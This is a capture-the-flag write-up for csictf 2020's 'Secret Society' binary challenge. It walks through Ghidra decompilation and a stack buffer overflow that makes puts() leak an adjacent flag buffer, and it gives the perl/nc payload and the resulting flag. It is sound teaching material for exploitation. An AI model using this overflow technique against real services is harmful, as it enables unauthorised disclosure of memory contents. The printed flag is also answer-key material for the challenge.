## Description

Wanna enter the Secret Society? Well you have to find the secret code first!

```  
nc chall.csivit.com 30041  
```

## Analysis

Decompile with Ghidra and look at `main()`:

```c  
undefined8 main(void)  
{  
 size_t sVar1;  
 undefined8 local_d8 [2];  
 undefined4 uStack200;  
 undefined auStack196 [108];  
 char local_58 [56];  
 FILE *local_20;  
 char *local_18;  
 __gid_t local_c;  
  
 setvbuf(stdout,(char *)0x0,2,0);  
 local_c = getegid();  
 setresgid(local_c,local_c,local_c);  
 memset(local_58,0,0x32);  
 memset(local_d8,0,0x80);  
 puts("What is the secret phrase?");  
 fgets((char *)local_d8,0x80,stdin);  
 local_18 = strchr((char *)local_d8,10);  
 if (local_18 != (char *)0x0) {  
   *local_18 = '\0';  
 }  
 sVar1 = strlen((char *)local_d8);  
 *(undefined8 *)((long)local_d8 + sVar1) = 0x657261206577202c;  
 *(undefined8 *)((long)local_d8 + sVar1 + 8) = 0x6877797265766520;  
 *(undefined4 *)((long)&uStack200 + sVar1) = 0x2e657265;  
 auStack196[sVar1] = 0;  
 local_20 = fopen("flag.txt","r");  
 if (local_20 == (FILE *)0x0) {  
   printf("You are a double agent, it\'s game over for you.");  
                   /* WARNING: Subroutine does not return */  
   exit(0);  
 }  
 fgets(local_58,0x32,local_20);  
 printf("Shhh... don\'t tell anyone else about ");  
 puts((char *)local_d8);  
 return 0;  
}  
```

This prompts us for a secret phrase, using a buffer that is only 16 bytes, but
it's succeptible to a buffer overflow. What happens when we run it? Create a
fake `flag.txt` and test locally.

```  
kali@kali:~/Downloads$ echo flag > flag.txt  
kali@kali:~/Downloads$ ./secret-society  
What is the secret phrase?  
hello  
Shhh... don't tell anyone else about hello, we are everywhere.  
kali@kali:~/Downloads$ nc chall.csivit.com 30041  
What is the secret phrase?  
hello  
Shhh... don't tell anyone else about hello, we are everywhere.  
kali@kali:~/Downloads$ nc chall.csivit.com 30041  
What is the secret phrase?  
fooooooo  
Shhh... don't tell anyone else about fooooooo, we are everywhere.  
```

It's just printing out our input from `local_d8` even though the flag is
sitting there in `local_58` after the `fopen()` and `fgets()` calls. We can
overflow the input buffer though to avoid having a null terminator until the
beginning of `local_58`. Then the flag will be read into `local_58` and the
`puts()` call on `local_d8` should print our input, plus the flag at the very
end.

## Solution

We have to fill 3 buffers:

* `local_d8` (16 bytes, our input buffer)  
* `uStack200` (4 bytes)  
* `auStack196` (108 bytes)

That will leave the null terminator at the beginning of `local_58`. Test
locally:

```  
kali@kali:~/Downloads$ perl -e 'print "A"x16 . "B"x4 . "C"x108' | ./secret-society  
What is the secret phrase?  
Shhh... don't tell anyone else about
AAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC,flag  
```

That worked, so run it against the remote server to get the flag:

```  
kali@kali:~/Downloads$ perl -e 'print "A"x16 . "B"x4 . "C"x108' | nc chall.csivit.com 30041  
What is the secret phrase?  
Shhh... don't tell anyone else about
AAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC,csivit{Bu!!er_e3pl01ts_ar5_5asy}  
```

The flag is:

```  
csivit{Bu!!er_e3pl01ts_ar5_5asy}  
```

Original writeup
(https://github.com/dobsonj/ctf/tree/master/writeups/2020/csictf/secret_society).